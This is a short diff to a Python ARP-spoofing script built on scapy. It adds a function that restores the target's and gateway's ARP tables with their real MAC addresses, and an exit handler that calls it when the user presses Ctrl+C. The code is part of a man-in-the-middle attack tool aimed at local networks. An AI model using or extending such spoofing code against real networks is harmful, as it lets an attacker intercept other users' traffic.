@@ -53,6 +53,11 @@ def send_packet(mac_ip_of_target, mac_ip_of_gateway):
     scapy.send(arp_response,verbose=False)
 
 
+def reset_poisen(mac_ip_of_target, mac_ip_of_gateway):
+    # op=2 means arp-response
+    arp_response = scapy.ARP(op=2,pdst=mac_ip_of_target["ip"],hwdst=mac_ip_of_target["mac"],psrc=mac_ip_of_gateway["ip"],hwsrc=mac_ip_of_gateway["mac"])
+    scapy.send(arp_response,verbose=False)
+
 def clear_terminal():
     subprocess.call("clear")
 
@@ -90,4 +95,9 @@ try:
         print("\nCTRL+C to exit.")
         time.sleep(args.time)
 except KeyboardInterrupt:
+    print("Poisen reseting.")
+    reset_poisen(mac_ip_of_gateway,mac_ip_of_target)
+    reset_poisen(mac_ip_of_target,mac_ip_of_gateway)
+    time.sleep(1)
+    clear_terminal()
     print("Exited.")
